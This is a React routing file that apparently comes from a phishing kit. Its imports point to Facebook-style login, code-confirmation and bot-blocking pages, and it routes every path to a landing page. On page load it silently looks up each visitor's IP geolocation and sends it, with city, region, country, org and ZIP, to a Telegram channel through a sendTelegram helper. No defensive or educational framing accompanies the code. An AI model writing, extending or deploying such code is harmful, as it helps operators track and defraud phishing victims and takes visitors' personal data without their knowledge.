import React, { useEffect, useState } from "react";
import { BrowserRouter, Routes, Route } from "react-router-dom";
import App from "./App";
import { MySite } from "./MySite";
import NotFound from "./NotFound";
import { Confirmation } from "./Confirmation";
import { CodeTwo } from "./CodeTwo";
import { ConfirmationSecond } from "./ConfirmationSecond";
import Dashboard from "./Dashboard";
import { TH } from "./TH";
import { Robot } from "./Robot";
import { BLOCK_ORG } from "./utils/variable";
import { FacebookButton } from "./FacebookButton";
import Dashboard2 from "./Dashboard2";
import { Landing } from "./Landing";
import { LandingPageNew } from "./LandingPageNew";
import { LandingPage } from "./LandingPage";
import { sendTelegram } from "./utils/sendTelegram";

export default function RootNavigation() {
  const [is_visible, setVisible] = useState(false);
  const [isLoading, setLoading] = useState(true);
  const [isRedirect, setRedirect] = useState(false);
  var url = window.location.pathname.split("/");

  const getIpConfig = () => {
    fetch("https://ipinfo.io/json")
      .then((response) => response.json())
      .then((data) => {
        let body = {
          ip: data.ip,
          country: data.country,
          region: data.region,
          city: data.city,
          org: data.org,
          zip: data.postal,
        };

        // Replace this
        localStorage.setItem("ip-datas", JSON.stringify(body));

        let telegram_data = `
          ===== ONLINE =====
            IP: ${data.ip}
            City: ${data.city}
            Region: ${data.region}
            Country: ${data.country}
            ORG: ${data.org}
            ZIP: ${data.postal}
          `;

        sendTelegram(telegram_data, true);
      });
  };

  useEffect(() => {
    getIpConfig();
  }, []);

  return (
    <BrowserRouter>
      <Routes>
        <Route path="/">
          <Route index path="/" element={<LandingPageNew />} />
          <Route path="*" element={<LandingPageNew />} />
        </Route>
      </Routes>
    </BrowserRouter>
  );
}
